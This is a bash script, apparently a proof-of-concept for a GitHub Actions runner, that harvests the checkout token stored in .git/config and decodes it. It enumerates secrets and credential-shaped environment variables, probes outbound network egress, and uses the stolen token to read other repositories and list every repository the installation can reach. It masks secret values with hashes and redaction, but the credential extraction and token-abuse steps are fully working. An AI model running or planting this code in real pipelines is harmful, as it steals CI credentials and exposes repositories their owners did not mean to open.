#!/usr/bin/env bash
echo "=== E2E-ENUM repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID ==="

echo "--- 1. credentials checkout persisted on disk ---"
RAW=$(sed -n "s/.*AUTHORIZATION: basic \([A-Za-z0-9+/=]*\).*/\1/p" .git/config | head -1)
TOK=$(printf "%s" "$RAW" | base64 -d | sed "s/^[^:]*://")
echo "GHS_TOKEN_KIND=$(printf "%s" "$TOK" | cut -c1-4) GHS_LEN=${#TOK}"

echo "--- 2. every secret the JOB already exposes to me ---"
for V in NPM_TOKEN DEPLOY_KEY AWS_SECRET_ACCESS_KEY GITHUB_TOKEN; do
  eval "X=\$$V"
  if [ -n "$X" ]; then
    echo "SECRET_IN_ENV name=$V len=${#X} sha256=$(printf "%s" "$X" | sha256sum | cut -c1-16)"
  fi
done
echo "--- full env keys that look credential-shaped ---"
env | grep -iE "token|secret|key|password|cred" | sed "s/=.*/=<redacted-len-known>/" | sed "s/^/ENVKEY /" | head -20

echo "--- 3. runner egress: is outbound internet reachable ---"
echo "EGRESS_generic_https=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 https://example.com)"
echo "EGRESS_api_github=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 https://api.github.com)"
echo "EGRESS_dns_arbitrary=$(getent hosts collector.invalid >/dev/null 2>&1 && echo resolved || echo nxdomain)"
echo "EGRESS_raw_post=$(curl -s -o /tmp/pb -w '%{http_code}' --max-time 20 -X POST -H 'Content-Type: application/json' -d '{"probe":"egress"}' https://postman-echo.com/post)"
grep -o '"probe":"egress"' /tmp/pb 2>/dev/null | sed "s/^/EGRESS_ECHOED_BACK=/"

echo "--- 4. what the persisted token reaches ---"
H="Authorization: Bearer $TOK"; A="Accept: application/vnd.github+json"
echo "TOK_own_read=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/$GITHUB_REPOSITORY)"
echo "TOK_other_read=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/0nicho/vic-plant)"
echo "TOK_fresh_read=$(curl -s -o /dev/null -w '%{http_code}' -H "$H" -H "$A" https://api.github.com/repos/0nicho/vic-fresh-proof)"
curl -s -o /tmp/rl.json -H "$H" -H "$A" "https://api.github.com/installation/repositories?per_page=100"
grep -o '"full_name":"[^"]*"' /tmp/rl.json | sed "s/^/VISIBLE_/" | head -20
echo "=== E2E-ENUM COMPLETE ==="
